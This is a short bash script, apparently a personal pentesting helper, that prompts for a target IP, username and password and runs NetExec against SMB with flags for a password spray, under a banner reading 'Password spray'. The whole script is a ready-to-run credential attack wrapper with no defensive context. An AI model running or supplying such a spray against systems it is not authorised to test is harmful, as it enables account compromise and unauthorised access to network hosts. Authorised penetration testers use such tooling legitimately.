#!/bin/bash
BOLD="\033[1m"
RED="\033[31m"
RESET="\033[0m"

echo -e "${BOLD}${RED}wow ! Password spray  ---<${RESET}"

 
echo "Ip:-"
read ip

echo "username:-"
read username

echo "Password:-"
read password

nxc smb $ip -u $username -p $password --continue-on-success --no-brute
